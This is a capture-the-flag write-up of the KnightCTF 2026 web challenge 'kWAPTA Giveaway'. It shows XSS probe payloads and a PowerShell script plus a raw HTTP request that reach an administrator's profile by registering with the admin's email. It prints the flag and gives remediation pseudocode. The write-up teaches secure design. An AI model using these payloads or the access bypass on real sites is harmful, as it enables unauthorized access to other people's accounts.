# kWAPTA Giveaway - Web Challenge

**Challenge:** kWAPTA Giveaway  
**Category:** Web Security  
**Points:** 0 (Giveaway)  
**Author:** NomanProdhan  
**Difficulty:** Easy  

## Challenge Description

> The admin got your flag.
> 
> **Connection Info:** http://45.56.66.96:8765/

## Initial Reconnaissance

The challenge presents a "KnightSquad Academy" student portal with the following features:
- Home page
- Student registration
- Profile page

The hint "The admin got your flag" suggests we need to access the administrator's account or data.

### Portal Structure

```
http://45.56.66.96:8765/
├── index.html (Welcome page)
└── portal.php
    ├── ?page=home (Main page)
    ├── ?page=register (Registration form)
    └── ?page=profile (User profile)
```

## Vulnerability Analysis

### Testing the Registration Form

The registration form accepts two inputs:
- **Full name** (text field)
- **Email address** (email field)

Initial tests showed that both fields properly escape HTML/JavaScript, preventing XSS attacks:

```bash
# XSS attempt in name field
Name: <script>alert(1)</script>
Result: &lt;script&gt;alert(1)&lt;/script&gt; (Properly encoded)

# XSS attempt in email field
Email: <img src=x onerror=alert(1)>
Result: &lt;img src=x onerror=alert(1)&gt; (Properly encoded)
```

### Exploring Other Attack Vectors

Several attack vectors were tested:
- ❌ **Reflected XSS** in `page` parameter - Not vulnerable
- ❌ **LFI (Local File Inclusion)** - Not vulnerable
- ❌ **SSTI (Server-Side Template Injection)** - Not vulnerable
- ❌ **SQL Injection** - No database errors observed

### The Breakthrough: IDOR Discovery

The support section on the home page revealed the administrator's email:

```
If you run into any issues with your account, please contact 
the portal administrator at admin@knightsquad.academy
```

This led to testing an **IDOR (Insecure Direct Object Reference)** vulnerability: What happens when we register using the admin's email?

## Exploitation

### Step 1: Register with Admin Email

Using PowerShell to test the theory:

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$body = @{
    name='Test User'
    email='admin@knightsquad.academy'
}
$response = Invoke-WebRequest -Uri "http://45.56.66.96:8765/portal.php?page=register" `
    -Method POST -Body $body -WebSession $session -UseBasicParsing
```

### Step 2: Access the Profile

When visiting the profile page after registering with `admin@knightsquad.academy`, instead of creating a new student account, the application returned the **administrator's profile**!

### The Vulnerability

The application logic flaw:
1. Registration checks if the email exists
2. If email matches admin's email → displays admin profile
3. **No authentication check** to verify if the current user IS the admin
4. The flag is displayed directly in the admin's profile

## Solution

**Final Payload:**

```http
POST /portal.php?page=register HTTP/1.1
Host: 45.56.66.96:8765
Content-Type: application/x-www-form-urlencoded

name=anything&email=admin@knightsquad.academy
```

**Response reveals:**

```html
<div class="card">
    <h1>Profile</h1>
    <h2>Administrator</h2>
    <p class="muted">
        Requested Student ID:
        <span class="id-badge">STU-557309</span>
    </p>
    <div class="profile-field">
        <strong>Name:</strong> Admin
    </div>
    <div class="profile-field">
        <strong>Email:</strong> admin@knightsquad.academy
    </div>
    <div class="profile-field">
        <strong>Role:</strong> Portal Administrator
    </div>
    <hr>
    <h3>Internal Note</h3>
    <p><strong>Flag:</strong> KCTF{c0ngr4tul4t10ns_y0u_f0und_th3_fl4g!}</p>
</div>
```

## Flag

```
KCTF{c0ngr4tul4t10ns_y0u_f0und_th3_fl4g!}
```

## Vulnerability Type

**IDOR (Insecure Direct Object Reference)**

The application allows users to access administrative profiles by simply providing the admin's email address during registration, without proper authorization checks.

## Key Takeaways

1. **Authorization vs Authentication**: The application authenticates the session but fails to authorize access to admin-only resources
2. **IDOR Prevention**: Always verify that the current user has permission to access the requested resource
3. **Email Disclosure**: Publicly displaying admin email addresses can facilitate IDOR attacks
4. **Principle of Least Privilege**: Users should only access resources they own

## Remediation

```php
// Vulnerable code (pseudocode)
if ($_POST['email'] == ADMIN_EMAIL) {
    display_profile(admin_profile);  // ❌ No auth check!
}

// Secure code (pseudocode)
if ($_POST['email'] == ADMIN_EMAIL) {
    if (current_user_role() == 'admin') {  // ✅ Verify authorization
        display_profile(admin_profile);
    } else {
        display_error("Access denied");
    }
}
```

## Tools Used

- PowerShell (Invoke-WebRequest)
- Web Browser
- Manual testing

## References

- [OWASP: Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

**Author:** umair-aziz025  
**Date:** January 21, 2026  
**CTF:** KnightCTF 2026
